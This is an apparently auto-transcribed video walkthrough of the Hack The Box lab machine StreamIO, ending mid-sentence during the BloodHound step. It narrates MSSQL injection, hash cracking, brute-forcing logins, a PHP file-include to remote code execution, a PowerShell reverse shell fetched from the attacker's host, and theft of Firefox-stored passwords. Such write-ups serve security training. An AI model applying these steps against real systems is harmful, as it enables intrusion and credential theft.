 what's going on youtube this ipsec we're doing stream io from hack the box which had a lot of steps because there's a lot of technology put into this box like microsoft sql php firefox active directory lapse it's got a lot going on in it but my favorite thing about this box is the fact that it is a microsoft sql server and has been hardened to prevent doing xp cmd show because most of the time we see microsoft sql it's just as simple as running a command from the database and then using a potato to privacy it's not that easy in this and we're going to take a lot of time to explain how to do microsoft sql database enumeration by hand because it doesn't have information schema but it does have its own internal database objects so you can do the same thing it's just a little bit different so we'll spend a lot of time talking about that so with that being said let's just jump in as always we start off with an nmap so dash sc for default scripts as v enumerate versions o a output all formats bring the nmap directory and call it stream io and the ip address of 1010 11.158 this can take some time to run so i've already ran it looking at the results we have a lot of ports i'm guessing 13 because we see 987 filtered and it starts right off with the main which is dns on 53 in simple dns plus then the next thing is microsoft iis on port 80. so i'm guessing this is going to be a domain controller also kerberos on 88 ldap on 389. we have some information like the hostname istreamio.htb and if we go to 443 which is https we see two other well we see the same domain stream io.htb but also watch.streamio.htb so let's go add these to the host file and then take a look at all the websites i always start with websites just because they're very quick we could have done like an smb scan to find open file shares but i generally start with websites you never know what information you'll get so 10 10 11 158 and this can be stream io.hdb and watch.streamio.hdb so we have those in our host file so let's just go browse the website so i'm going to go first 10 10 11 158 to see what this looks like and we just get an iis page i'm going to do stream io.htb and an iis page and what was the last one watchdotstreamio.htb we got another iis page so now let's check https because maybe it's only on ssl we'll probably have to accept this a few times not found it's not that default iis page so that's good i'm going to do https here as well click advanced accept and we get a movie streaming service so let's try the third one watch and what is this is it gonna be the same thing no it's slightly different um the one thing i'm curious about is just if this is iis itself um we can send this over to burp suite or i can just do a curl dash v also dash k because it's um [Music] what is it ssl with a self signed certificate so the dash k just accepts it blindly and it is microsoft http api 2.0 what is if we just do http we could have also um just looked at nmap because nmap says it so we get iis that's a bit odd i'm going to check stream io.htb see if it is iis as well going up i should have just had output or done a head request so there is the get and we get x powered by asp.net that's not the server though um what so we got a server header and then x powered by i don't think there's actually a header with this server server certificate no there is not a header that says server that is bizarre actually i'm going to confirm just in burp suite because normally um i'm used to seeing that i don't know why i afford it let's just go in the history send a repeater and there is a server header microsoft iis so bizarre if i just get slash yep it's there we also get x powered by php telling us it is probably both php and asp.net additionally the cookie that gets set is a php session id so we know this is a php website so let us now switch over to ferro buster and i used to not like fair buster because i didn't like directory recursion when i was doing dirt busting because of just how long it takes however there's one cool feature of ferro buster that kind of alleviates that pain so we'll do dash u stream io.htb we know it's php and i think o is out let's do fair buster dash h dash o is output file so i'm going to call this stream io dot htb dot ferro buster and i think that's all we need uh we probably need the dash k option to accept the ssl certificate and we see it starting we see a lot though of duplicate things like because if we look at a windows server it's not case sensitive so slash admin and slash admin with a capital a are going to be the same thing so i'm going to kill that and i'm going to look at the default word list this uses and it's inside of set list so there's a dash lowercase option to only do lowercase things and that's going to speed this up tremendously so dash w the word list dash lowercase and there's one other thing we'll do to speed this up we see it doing a lot of just busting directories and let's say i don't want to go and crawl admin fonts because it's going to send 53 000 requests here that may take a while i'm going to hit enter to go into the menu and then i can see each thread here so it says c to cancel so if i do c dash f to four so it doesn't ask me a question and then ten it's going to cancel crawling this branch so now i no longer have to wait for this one to finish we could also do the same thing for like admin js so c a f eight to cancel that and now this has been canceled so we can speed up our door busting by just like hand picking which directories we don't want to crawl when it goes down somewhere so i do love that feature and we can see it finding things already like index.php about.php going into the admin directory finding index.php there so we'll let fearow buster do its thing and we should uh stir up another one right so i'm going to copy this whoops not paste copy and then go to the next pane and we need to do one for watch so um it did not like copying that one line break so backspace set list like that yeah i think that's good and we'll specify watch.stream.io and make sure this starts going off everything looks fine it has found some things so i'm just gonna let this run we have a big recon task running on in the background so now we can take a look at the two websites we have this with a contact form so if we put a name a number uh some email test we can see exactly what happens message has been sent we probably should have like put a cross-site scripting thing in here to see if it's um anyone clicks links or things like that since i've already solved this box once i'm not going to waste time going down everything there that's just something i would do oddly enough the login is only on the home page if i click contact us i don't see that login link anymore we have oliver at stream.io so we have a potential username there if we click on login it wants username password so we'll do let's try admin admin and login failed so i don't really see too much here if we go to watch we can try adding our email i'm going to intercept this request just to see exactly what happens so proxy intercept on add this we can look at the request it's going to just slash um go into repeater send it and it says subscribed i wonder if it does that every time so i'm going to copy this send it to see if it will say you already are subscribed but no it just always says that if we send it like an invalid email roo does it do anything it looks like it does if we if we just send a post request what happens to this nothing so we need to send the variable at least but i don't know much we can do to that maybe it's got some type of time-based injection because it was just saying subscribed and when i did a valid email not valid email it was always given the same output i have a hard time finding sql injection in that we could copy and paste or copy this request send it to sql map but if i did that for every field every time in every video my videos would get super long so um let's move on and see what we have here we do have a search.php and index.php and blocked.php so let's take a look at those so turn intercept off we can do search.php and we get a page and it looks like if we just hit search.php maybe every movie comes out if we click watch what happens we just get javascript saying it's unavailable so if i do let's say 500 it's thinking i think this is going slow because i have my two fair busters going we just get 500 days of summer if i do let's say 500 and then a comment we get nothing so at this point we should think about how this query works so if we just hit search.php it's giving us a list of everything right and i guess before that one thing i like doing is sending this into fluff a fuzzing tool and fuzzing for special characters so let us do that real quick and i can show why this is beneficial and we don't skip a step um it's kind of obvious right now this is a database so the whole fluff thing isn't necessary we could just blindly guess things but this if you get stuck and want to identify things it's always good to look for a pattern on how things behave differently right so we're sending a post request to search.php so let's go over to a fluff tool and replicate that so dash u htps watch dot stream dot io and then dash d for data and it's going to be q equals fuzz because we want to replace this so fuzz is going to go through a word list and put that character everywhere so the word list we want to use is going to be opt set list fuzzing i like special characters and it's just a list of all the special characters so opt setlist fuzzing special characters and because this is a post request we have to set the header for content type so content type and we'll just copy this application x url forwarded get rid of my fat fingered capital h now i think this is enough to start right no it's not um probably dash k it dies immediately so where are we oh so watch dot stream dot io slash still failing oh stream i o dot htb my brain is telling me like io is a top level domain so that happened but we see requests coming and i may just pause the video and let these ferro busters finish um having a hard time because it is going slow but we can probably just filter everything with lines 34 out because this is what most things are and we with this we want to identify what is unique right so we're going to do dash dash filter lines 34 and that's going to hide all of those and we only get a handful so if we get period we get stuff so let's go take a look at what period does so if we do period we can turn burp suite off let's see search period we get everything that has a period in it so like mr fox has a period uh gi joe the rise of cobra does so that makes sense why that isn't a um what was it going to say let's say dollar is not here so if i do dollar we get nothing because dollar matches nothing here and that's probably the lines equals 34. so let's do a slash do movies actually have slashes in them so if i do slash we get 50 50. so yes the answer is so let's go to the end where we have lots let's do percent right so if i just put in percent we have a dump of everything that's weird but if you think about it it's not weird because percent and sql is a wild card um these underscores are also like special characters and at least ms cq sequel so that's probably why we get this the real like oddity is going to be the ampersand and the reason why that's going to give us a list of everything is it just does something weird to our http request i bet if we did a search here for that um it only shows us um a handful of movies that have this it's not a list of everything but we didn't tell fuff to url encode or payload so what happened here is if we go back to this let's actually intercept a request it's going through burp so proxy intercept on so if i search for ampersand we can look at what a browser does the browser is going to url and code that but what f did is it did not url encode it so it sent this which is like a new argument because arguments and this are separated by ampersands so if we send this we're going to get a list of every movie because we just sent a blank query right and that matched everything so i talked about all of this because it's somewhat important to identify what is going on in the background right um the fact that it accepted percent as a wildcard tells us a lot because if we're going in a database um let's see v queries i'm guessing the query looks something like select star from movies where name and that's probably using a like statement here and if we just did like 500 it's not going to find anything it's going to look for something that is just 500. so the query is adding percents for us and this is going to be important when it comes to breaking the query and fuzzing for it um it could have also been well it can't because we know the percent but another way to do this in ms sql if it is mssql is going to be using the contains and contains going to be a bit faster because you can do a lot of something called like fuzzy matching if you go to their documents page it'll tell you how that works but it would actually um go off an index table and use terms like if this phrase is near this phrase and things like that so if it was performance it would probably be like where and then would go into contains and then i'm guessing it would be name comma 500 and one of the weird things with contains is the wild cards go back to stars percent is not a wild card and contains to my knowledge so um this is how we know our syntax is not like this and um it tells us we won't we probably won't have to worry about parentheses because it'd be weird for a developer to use parentheses in a statement like this so let's go with our logic and try union injections right so if we did um let's say we're not union let's just try fuzzing for it right we try 500 and then a comment actually i'm going to take a step back let's do just 500 and i'm going to match for this because any time a query happens we start building this table right so if i say does not exist we see zero matches now if i do 500 we see one match so let's try putting a comment in right and we get zero matches and we're used to something like this giving us a match and if we look at what we just did here is we turned the query into this and we didn't append this wild wildcard right so we're doing where name is equal to begins like we have something and then ends with 500. so if we wanted to test for this we would have wanted to put the wildcard here and we go back we have one match because now we injected our query back in right or a wildcard back into the query so it matches um there's one other thing i'm going to do is a click of this little gear icon and auto scroll to match so when i hit ctrl enter to send the request it's automatically going to scroll here to let me know so now that we know we have sql injection the next piece is to do um a union injection and we know we have sql because we just put valid sql syntax here um and it came back right so we can do a union select one and i'm looking for a match so two three four five six seven eight nine and i'm starting to think there's no more fields here so that's weird i'm going to make my query not return anything and we're going to go do that same exercise so let's go back here and whenever testing for sql injection i like testing for something i know that returns a result and doesn't return a result just to make sure everything looks good four [Music] five six and we got a match if we did seven it's going to go back to no so now we have a valid union and we see two is right here and three is right here so we can output data in both of these so if i did please subscribe uh nothing that's weird i wonder if we can do select please and select subscribe i think that would work in ms uh not ms um in my sequel i'm not sure how to just pass strings here right but we could have done probably or 9001 in leet and there's numbers oh wait one yeah there we go so 9001 and leet did go here but let's go and excel data and one of the things we could do is go to like an ms sql cheat sheet and like go down the list and since this is a microsoft database um the one thing i always do first is test for xp command inject because if we get that we don't have to enumerate the database we just instantly get a shell and a lot of microsoft sql is if it is sql injectable it's also vulnerable to something called stacked queries which a lot of other database languages are not and that's essentially um when you just add on a query so i'm going to call this union real quick and we're going to call this stacked try to stay organized and the quickest way to test for stacked if you're on the network is just using like dirt tree or something the downside to this is we're not going to be able to um get output with this so 10 10 14 8 and then a share name and a file and we also have to make sure we send the comment because it's going to append that percent and if i did nclvnp445 we should see this connect back to me right uh no how did i screw this up executor tree 500 so we end that does exact is it no oh it's xp underscore dirty there we go and we get a connection back now we could go and run responder because it's trying to connect to us over 445 and see what user it's running as and if it's going as a regular user maybe we can crack their password right so um i'm gonna go opt responder i'm gonna do python3 responder dot pi dash i ton zero and run this again and we see it's running as dc dollar and this is going to be a system account i'm not even going to bother cracking this because system accounts are randomly generated so nothing we can do here if this was a network there's a chance we could like um do some type of ntlm forwarding but well it's just one box here and we can't forward back to itself so nothing to go on here the next one would be xp cmd shell and to test this i generally just do a ping so we can try ping 10 10 14 8 and we'll do sudo tcp dump dash i ton xero we have to specify icmp and we try to get this it doesn't work if we look at the ms sql cheat sheet it talks about reconfiguring so we could try to enable it and this isn't going to work because we're not a database admin but doesn't hurt to try right so we put the show options one reconfigure then we go back to the cheat sheet and we want to enable xpcmd shell here then reconfigure and now we can exec it and going back we don't get anything we could try um i think it's like master dot dot is another one master dbo and we don't get anything from this so that is a complete lost cause so let's just go and start enumerating the database um i'm going to move union over here and we'll go back to here so we know we can control data here the very first thing i do is always at version and all this should be on that cheat sheet right so we see what version is it's microsoft sql server 2019 so we've confirmed it is indeed sql server we could look at the user so if i just do user we see we are db underscore user we could get like the current database name and it's stream i o and this is also going to be a like int so if we do zero that's current one's gonna be the first database two is the second three is another database so a lot of databases on this one through four is going to be default ms sql things five is stream i o then we have stream i o underscore backup and then future wise we don't have anything so um the main thing to know is stream i o and stream i o backup now before x filling data out of these we need to um figure out the table structure and in my sequel which we're normally used to there's that whole information schema thing um ms sqo doesn't use information schema it has other methods so let's go and google msql reference maybe i think this may work reference guide and let's see i want to say it's something views system catalog views object and then we have all these columns here so if we do um probably sys columns there's tell us columns of a table so i'm not going to go read through all this document but if you're curious whenever i reference a table um you can just go back here and see what those are right and that's going to be important because we want to um select all the table names and sys objects is where table names are and we want the name and id and we want the id from it because in other tables like the sys columns it's going to reference our table name by id not the name so that's why i want both the name and the id because humans look at the name machines will look at the id and since we can export data in both of these like up here and here we could do select name id and then here we do from stream io sys objects where x type is equal to u and x type i think that's on this page too right uh no we need to find ms sql sys objects this is the quickest way i get to it here's this this is going to be the user created um what type i guess is not x type but type user defined right so we do this and we see we got movies and user now this works and also the id right here but this works because our sql injection the code can handle multiple rows right and a lot of sql injections it can't so i'm going to from now on move to a format that um we don't depend on this because i like this to be universal normally when doing sql injection i put everything just in one thing with concat and group concat and my sequel but it's a bit different and ms is sequel not much so we're going to put three back here and we're going to well actually we can leave this and the first function we're going to use is concat right this is the same as msql or my sequel so concat the variable then we're gonna do a colon and then the second variable right uh let's see select concat i think that was right one two three four five six from stream io what is wrong here if i do name do i get anything movies watch users that is right so concat name id okay i wonder if i just screwed up with colon okay here it is so it worked well this time maybe i had an unmatched uh quotation mark or something but we see movies colon id now we want to put both of these on um one row right and instead of doing group concat my sequel is string aggregate so string ag and then we want to separate this one i'll do it with a pipe because pipe is such an uncommon thing now if we just do this it's probably going to oh no it worked um i thought it was going to fail i generally like when doing it this way to put my whole sql query just here so i can see it a bit better without all the extra numbers so if we wanted to do that we can remove the from here and we can just say select and then paste it here and it did not work i wonder if we put it in quotes yep we are not quotes in parentheses but there we go and we have um column name colon id then a pipe column name colon id so this is good to me i'm going to call this dump uh i said i kept saying column name this is table name right so now we want to change this to get the actual columns so we're doing the select string aggregate concat and this time we're going to do um i think we just want name we don't need id anymore so we can just do string ag name from stream io and cis objects is where tables are cis columns are going to be where the columns are and where i'm going to say id is equal to uh we want to go back to dump table this 901 let's see here 901 enter we don't have oh no we do have a match i just i guess when i um shoot when i opened a new responder window it killed this config right but here all the columns so this will be dump columns and the ones we probably want are is staff password and username actually probably just use name and password and then we can do istaff afterwards so i'm going to open a new tab let's copy our search parameter to the new tab and we just want to now i'm going to steal this one because this is using concat and we're going to change this to just be from users and we can go back here um use name password so concat username and oh we have two line breaks i was like why did it start dumping everything but there were two line breaks there and we have a error because we didn't return anything so string aggregate can cat username colon password from i wonder if we have to do stream io dot users two dots no let's see select string aggregate concat username we don't have a parenthesis here still nothing but we did change it slightly to put the database name here i do dot users to find it it does um we also don't need the database at all whenever things don't work in mssql when you're just referencing database and then table i generally do dot dot this one i think is called schema and it's normally.dbo for database object um but if you just do dot it defaults to that as well microsoft sql is weird like any microsoft product right so let's auto scroll and we can copy all of this right so copy this and it's really really ugly so i'm going to the users.txt and what i'm going to do is paste and let's remove all the spaces so percent s space star and then slash g and now we have no more spaces and the line breaks we want because we use the string aggregate is this pipe character so i'm going to do percent s pipe and then backslash r for return character g and now we have username and password we could also go back to this if we really wanted to and do comma and then is underscore staff i believe it was and get if users are staff or not so we say vusers with staff dot text and do the same thing so this is pipe backslash r s pipe there we go and it looks like oddly enough admin didn't extract but we have or maybe i just didn't copy far enough for admin but everyone is staff here so that does not really help us but we do have a list of all users now i don't know what format this is generally when i'm interacting with the database and something is 32 characters i'm thinking md5 sum so let's try um cracking all this i'm going to scp user.txt over to my cracking machine which i call the kraken and i call this stream io dot hashes okay so ssh over to kraken and i'm just going to move that into the hashcat folder hashes let's go into hashcat and then i want to say mode 0 is md5 and we just have usernames in a hash thing so i'm going to do dash dash user i don't know if it's user username we'll find out in a minute and then we specify the hashes and then the word list so opt word list rocky.text so let's see if it complains about anything it looks like it is happily cracking right and we can get rid of the word list and because we have the dash dash users uh flag there i can just do show and it outputs us username hash and password so let's copy all of these and we can i guess get rid of that user pass user pw dot text and paste that awesome so now we want to try to log in with one of these credentials generally i'd try like crack map exec against smb first but in the sake of time let's just jump to http login fields because again i know that's the answer here and eventually we'll use crack map exec anyways so i'm going to cat starfarer buster which is going to be all of my output files and i'm just going to grab for login and we see at streamio.htb there is a login so let us see what this looks like it's just username password i'm going to see if i can switch this dark mode and i'm gonna send this over to burp suite and i'll test for ipsec please subscribe log in and let's see we can drop this request send this one to repeater save this to be dump creds again trying to stay organized as i go along and we want to see a string that appears on this login failed is a good one so i'm going to use hydra to quickly brute force this and hydra is going to want it in um we can either give it a username password and a password file uh yeah username list and a password list but if we give it both of those it's going to try every password for every user and that's not really efficient because if we look at our user hash password list it's unlikely that um yoshihide hyde is gonna have the password sabrina because that's sabrina's password right um maybe padpad will be reused so if nothing comes back here i may try all users with this password if that doesn't work but um yeah so we need to convert this file into just username colon password for hydra so i'm going to pipe this over to awk the field separator is going to be colon and i can do print the first match colon the third match so we grab this and this right and we can say user pass.txt awesome so let's go over to this and it's sending a post to login.php on stream io the fields are username and password and since i can't remember the syntax i'm just gonna do dash h and uh dash c is how we pass this i believe i think dashie is colon right yeah colon separated login past format so we're going to do hydra c user pass dot text and then the domain stream io.htb the module we want to use the hdb post form and the form we want to post is login.php and now we put the parameters so username is equal to and then um like w fuzz or fuff you do fuzz in those tools you do carrot and then the variable for this so user and that's going to put the username in this dot text and we do password is equal to pass like this and then colon um find string and we're going to do login failed i think it's a capital l and a lowercase f and the quote and could not resolve stream.htb because it's stream io.htb and we'll see if this works we have one valid hit yoshi hide and the password is 66 boys and girls so let's go and log in so yoshi hide put his password in and i think i'm intercepting this right so we can drop this one request dropped no it wasn't get let's just retype it and we're logged in but the page looks similar but if we look at where register was there's now a log out so we're definitely logged in i'm going to look at the stream io.fairbuster file and we can see there is a admin and there's index and master.php in there so let's go to slash admin and we got user management user equal staff equals movie leave a message for the admin so user's admin if i do staff if i type sam it doesn't filter so i don't know exactly what this is doing if we check let's try master.php we get only accessible through includes so for this i probably would spend a lot of time fuzzing each of these parameters but the sake of time what we need to do is fuzz this um argument that we're passing here so we're going to go back to fuff so dash u put this in we also need k and we're going to fuzz parameters and whenever i fuzz this i generally do um like id or something and the word list is going to be opt set list fuzzing is there parameters let's see cd opt set list find dot grep i param and i'm gonna use web content or discovery and then they spurt parameter names because that one makes the most sense right we go here maybe we want to hide oh we probably need to give our cookie right because we're authorized so dash h um let's see let's just intercept a single request to get this there's probably a cookie option in fluff but we can just add it through the header as well at least i see no reason why we can't i need to put that in quotes do we still get 403s we get two hundreds so i'm going to let's do filter size 1678 and see if anything comes without this and we have debug so that is the one we don't know user staff we know movie we know so let's try this hidden debug parameter so if we do debug equals and we turn intercept off uh this option is for developers only let's do debug some parameters we're still getting nothing um let's try a file name and we get error which is weird let's try etsy pass wd nothing let's put a bunch of dot dot slashes so dot dot slash get nothing let's see if i ctrl u to view the source still nothing we can try like php filter and then i think base64 dash in code let's convert dot this and then resources equal to etsy pass wd resource is equal to index.php and we get something the whole reason i was targeting this is because we probably don't need to be in this mode but when we tried just index.php we got an error right so that was weird um i wonder if we got an error with any php file let's go back dot php nope only one that does exist so we can copy our [Music] filter here just because it's prettier if we don't do it in the view source and we can grab this base64. so let's do echo base64-d i can pipe this to index.php and i guess i copied some characters that don't exist but looks like it's fine um we get a password we got db admins password but it isn't too much else there is that master file and we can say this because as the password but master itself can only be included right so we can view the source of master and copy this entire thing and again echo dash n paste it base64-d pipe it to master.php and if we look at this we can include it from our file include right and we should look at let's see index i want to look at the debug parameter what are we doing um it's probably executing code because index.php did not um what should i say show us results and we can see why we get this error is if debug is equal to index.php it happens that's just weird but it is including files so since it includes the files it will execute it if it's php code and it gets it on the get parameter right so if we look at this master this is going to be i guess how all those forms operate and scrolling all the way down we see if the post variable include is set it's going to e do a file get contents and then eval it so let's see if we can execute this code right and file get contents generally works against urls or remote services unless php is configured not to um so first i'm going to try just etsy passwd then we can try doing it off a web server right so let's go back here and we'll change this request to a post and make sure we have the content type application xw whatever and then we'll post to admin and then debug is equal to master.php and the variable we want is include and we'll try etsy passwd send it over to repeater and see what happens does anything come out this is a lot of output uh oh wait post admin oh it's dumping the whole jesus that is the movie list is why it's so long i guess because master.php does include the movie list and maybe it's not printing anything let's do some php code so include is equal to echo please subscribe we can url and code this just in case we have to look for please no matches send it and we still have no matches so i wonder if we're doing something wrong here so this is just going to stream io.htb admin debug we can try including off ourselves 14 8 test.php let's see what happens here so let's just do sudo nc lvmp on 80. it's hung and it's trying to listen to us oh wait because it was doing a foul get contents and then evaling so because we just had um php code that wasn't working so if because the file get contents on php code said hey the file's not here and it tried to eval that error which was nothing right so let's make dirt dub dub dub and we're gonna do v um i'll call it ipsec.php and we can just do echo please subscribe like this and i think now it will actually have please in it right um if we stood up a web server that is so sudo python3 http server want to listen on port 80. we got test.php we called it ipsec.php so it got it and now we do have the data here right so we can put some php reverse shells magic in here i'm going to test out the system command so dub dub dub v ipsec and we'll just do system who am i and we'll go here and i'm going to just go to my slash form will be fine that's probably not multiple forms on there is multiple forms 926 matches oh god let's go to backslash html auto scroll and we can see the system command works we get output we're are the yoshihide user here now we could um connect back to us and try to crack his hash but why not just send us a reverse shell right so now that we have the system command let's replace it with a reverse shell and on windows the reverse shell i like using is called khan pty shell and the reason why i like this is because it sets our tty up for us well and if we do powershell we have tab autocomplete which is really nice when it comes to function names so it gives a nice instructions on how to use this so all we do is copy this powershell file and then we're going to create it on a web server so i'm going to call this con.ps1 we're just going to put it there the extension doesn't really matter and on this this is where the system command is we're replacing that with this command the stty raw and i'm going to listen on oh wait no the system command this is going to be this iex command and we're going to change this url to just be us so 10 10 14 8 and we called it con.ps1 and after this he does use basic parsing like that and invoke it so we'll do 10 10 14 8 9 000 1 like that so this is looking good i'm just going to do a search on quotes i only have one i think that is good and now what we do is this command i'm going to change it to b port 9001 because that's what we changed this one to and um i'm gonna try killing this real quick i have to netcat localhost 9001 control c let's see type reset uh control c up here type reset because i killed it i want to get a full screen before i do this because when it does this stty size this is setting or terminal size and if it's half pain it's going to get really wonky when we get the reverse shell so i want to get my terminal set up the way i want to interact with it which is full screen so now that we have that we can do this invoke con pty shell that looks good v ipsec.php this is going to execute it so and it executes and sends it to us let's send this we have a get on ipsec but it never hit con pty shell so that's bizarre going back into this we did not call powershell so we can do this again and right away we get a shell so if i do who am i uh error writing the okay i'm not sure what this arrow was i guess it's um i was trying to write to the console host history and i guess it got denied oddly enough is running to system32 it should be the user but um everything seems good so let us go to our home directory cd backslash users dir um maybe public dir we can't access public who am i slash all i must be a really stripped down user this yoshi hide does not have a directory which is bizarre um let's see net users he has a user on the box net users yoshi hyde member of domain users so i guess he just doesn't have a home directory let's do env see can i do cd env colon dir let's see user profile yeah his home directory is in system profile okay um not sure exactly why but let's just go back to the c drive and if we think about a recon if we go all the way back let's look at dump table uh the stacked maybe i guess i don't have it here um if we erase this and just do db name like that stream io remember i think it was db6 we had a database stream io backup and our user here was just um db underscore user and we couldn't access that backup database if we look at let's see index.php our user here is db admin so maybe this user can access that database so now that we have a shell on it we don't have to do sql injection we can just use an sql command with our shell and that is the hashes where is my pane there we go so we can do sql cmd because ms sql is installed on the server so it should have this binary if it didn't i'd probably drop chisel and do it through um my local boxes instance so dash u for username db underscore admin dash p for password we put it in and i already had a quote so we'll get rid of that and then the query with dash q and we're going to use stream io underscore backup colon and then select username password from users to dump the backup database and we have a handful of users this user in particular i recognized as being um local on the box so if i do net user nic37 is here yoshi height is here as well um james maybe jd god so let's copy this and we're going to go back to hash cat so go for v hashes stream io i'm going to call this stream io2.hashes and then let's get rid of all spaces and we'll replace it with one quote oh god um that did not do what i thought percent s space like that and then one colon nope let's see dw colon okay dw colon sometimes when you do like searching syntax utilize playing around to get it right it's going to take longer than just doing the few fields manually happens the best of us so now that we have that we can just go up and this time we're gonna crack stream i o two dot hashes and we can do a dash dash shell and see we have a few usernames and passwords so i'm going to copy this and go back to our box v stream io let's see let's go user pw and put the extra ones in and if we go back to our arc let's do cat arc field separator print one colon three two user what do they call it pass.txt okay we have all the usernames calling the passwords now hash cat or not crash cat crack map exec doesn't have a field like um hydra where we can take this instead how we do it this way is we create a username file so users.txt and we create a passwords and there's going to be a parameter like no brute force and it's going to do it sequentially so it's going to take the first line from user and the first line from password try to log in then go to the second line for both so that's what our next step is going to be so let's run cme smb 10 10 11 158 i believe the ip was and then dash u user.txt or maybe it's users.txt and p and then it was pw.text i think it's no brute force like that let's see if it airs out with a error it does not and we can see each user is going with one password and we have only one successful login that is nick 37 and the password of get them girls 2 at yahoo.com so that's where that the email is a password but um we can specify that specifically so do that and then next 37 and we can either like enum the shares or see if he has winrm access so instead of just dumping a list of shares i'm going to test when rm real quick so do the same thing and let's see if it says pound it does so we can now log in with this user so evil winrm dash i i want to say for ip dash u dash p and see if we log in and we have a shell as nick 37 and the last time we had a shell we enumerated the whole web database so there's nothing really left for us in ms sql so i'm going to check out the um win piece to see if one piece gives us anything else if windpeas does not then i will fall back to bloodhound so generally when i get shells my theory is like poke at databases get all the creds then go for privilege escalation and then go for bloodhound right so let's take a look at this and where's downloads i think google just brought me to an odd page we can go here and every time i um go to it i always like just downloading a new version because it gets updated so frequently i'm going to do the win ps any because this is net and honestly i don't know why dot net has like 32 and 64 bit um i always go for any whenever i'm given that option so let's go in dub dub dub move downloads win p's any i guess i already had a copy downloaded it's probably old um let's see one dot exe two win ps.exe and we can move win ps.exe to oh we have it okay um so curl 10 10 14 8 win ps.exe dash o win ps.exe and i probably shouldn't put it in this user's documents but oh well um looks like it downloaded do a dir still there antivirus did not remove it so we can do dot slash win ps and get it executed so i'm going to pause the video we're going to let this finish and we'll see um what this says so now that this is done i'm just going to search my history for my carol command and uh oh it's not there um dot slash win peas i think there's too many lines yeah so if you look here i'm at the top of my tmux buffer and there's nothing else there so um i'm going to run set dash option g history limit we'll make that buffer bigger value too large um so set option g history limit one two three one two three four okay i've made the history a bit bigger but let's just go to see if there's anything here so dot backslash win ps.exe go to the top of the history and we'll see if we have anything if we don't we're going to rerun win peas and then stop once we get to enumerating internet settings right because um tmux only has around 10 000 lines uh we upped that buffer so if we run it again we'll get more but it's one of the reasons why i like running things in like to out files and saving it to a file then cutting the file but yeah uh it looks like one thing that's highlighted read is firefox credentials exist app data roaming mozilla firefox profiles and it tells us to run sharp web so let's try running this tool if this tool fails then we'll download this database or probably the whole profile and try online so try offline i should say generally when you download things and then do it on your own computer it's called doing it offline so i'm going to google sharp collection because this is where a lot of net binaries are and just because it was called sharp web i'm assuming it's here and oh it's not in short collection um let's see copy link address let's see if there's a download here if we have to compile it i may just skip it and download the files right away but looks like there is something from four years ago we'll see if this still works so we'll download sharpweb i'm gonna guess we have to evade antivirus or something since it's so old but maybe it's obscure enough where we don't have to worry about that so move downloads shop web here curl 10 10 14 8 shopweb.exe dash oh shopweb.exe dot slash shopweb.exe and it had some instructions i think i just say all right argument one two uh full all or firefox i'm just gonna do firefox because that's the one that said it had credentials and it does not find anything so if we do all um it errors out oh it aired out on windows vault but firefox current user doesn't give us anything so i'm going to guess this tool is just too old and firefox changed something and now it's hung so i'm going to exit my evil winner m session we'll get it again and search up for firefox and see where it is it's probably in app data roaming profiles like this so go cd here cd app data oh we go go up one directory there we go and let's see we can download i wonder if we can download a whole directory 5r let's see like that let's download every file it says download success i don't believe it so sudo update db locate this file and i think it did so if we go to stream io it looks like it's here so 5rw and then put all those paths and it only downloaded times.json so it did not um i think powershell has compress let's see powershell make zip compressed archive so example let's see using a literal path let's try this dash path destination path compress dash archive and then 5 rwiv2l.default and this was dash path dash destination path 1.zip so we'll see if we can create this first and then just download it and then we'll try doing the other one let's see does not exist compress archive let's copy and paste because apparently we can't type paste that so 1.0 was created but the length let's see dir is there only one file in this that would be so troll there is oh god um let's look at this one i wonder if i just download this directory download boom isn't going to download multiple files so it's going to think about it first so i'm going to pause the video let this command run and we're going to see what ends up happening and it's been a few minutes and this has not moved i always have like iffy things with evil winrm's upload and download file so i'm going to do the compress archive and then we'll try copying it and that will probably work better so cd we need to go app data okay compress archive and then this will be dash path this destination path 2.zip and do a dir that is much bigger so i should be able to just download 2.zip and we'll see if this downloads quicker yep so that was a much better experience so let's see we got 2.zip there oh wait we are did it download everything it looks like it was um i was just expecting it to stream files oh well now we have everything and we want to use a tool called fire pwd i believe so github fire pwd here we go open source tool to decrypt firefox passwords i wonder if i even have it here i do not get clone cd fire pwd and let's see it wants the keys three and the sinons so cp and then we'll do hdb um stream i o then br and we want keys4.db we'll see this and then logins dot json so move keys logins to mozilla db i don't know if we have to do this i think it can just be in the current directory it's specified via um arguments but if we look at logins.json let's actually cat logins jq dot to make it pretty we can see and usernames and passwords are encrypted however they're encrypted with the keysdb file so if this was chrome those credentials would be encrypted with microsoft's built-in um d-papi i forget what that stands for but the main difference between firefox and chrome well there's a lot of differences but to me firefox is primarily like portable it tries to use everything internally whereas chrome uses all the windows api so if you use chrome it's probably going to use windows internal api to download files um it's ssl is not open ssl it's whatever where firefox bundles all that together so if there's a vulnerability an open ssl chrome won't be affected because windows doesn't use it they have their own ssl library if there's a vulnerability in windows then firefox won't be affected um i think chrome's password storage is more secure than firefox just because it uses windows internal thing but um yeah so i think if we move mozilla db move those files that we put in there two five pwds it decrypts them all so we have admin nick37 yoshihide jdog so let's just copy this v let's v users now let's do creds.txt i guess and paste these and let's see two three four five six seven eight so eight dw to remove the url and then we'll do two removes to get rid of the b colon so four colon there we go and remove the last character the password has a smiley face in it that's funny but um let's cat creds all dash f colon print one like that users.txt and we'll get to and put this as pw dot text and we're going to rerun our crack map exec so if i exit this we can just do the same exact goal user.txt there we go and we're going to rerun this with the new credentials we have in addition to all the old ones continue on success i want to say is that argument so by default crack map execs going to stop once it gets to success there is a flag to continue the continue on success flag and d god i think that's jay god um let's see yeah so i accidentally deleted an extra character here so v c b pass dot text pw dot text v there we go hopefully that's the only one i had screwed up let's see if any of these credentials work so it does not look like it that being said we do see um jd god in a password here for admin so maybe he reused his password i'm going to instead of users.txt i'm just going to be lazy and do jd god and we'll get rid of no brute force and just try every password we have for this one account because we do know that jd got exists on the system when we did a net user command earlier um so let's just see if anything works and we do get on however it is not pwned and it not being prone with smb means we're not an administrator so we just got a different user account we're not sure if this user account is good like is any better or not so let's just run bloodhound now and see if that tells us anything so i'm going to google bloodhound python because generally i like running blood down python first and again like everything else i always just re-download bloodhound whenever i run it because it does update quite a bit so if we do python3 bloodhound.pi and then we can specify the domain with dash d so stream io.hdb the user is jd god with two ds the password we can copy and we could use the other credential we have it doesn't matter what user you use with bloodhound at least when you use this python bloodhound in gesture the global catalog dc streamio.htb the name server is going to be 101011 158 c all and we want it in zip and c is collection so it does all collections and we'll see if we connect we do connect so let's go up 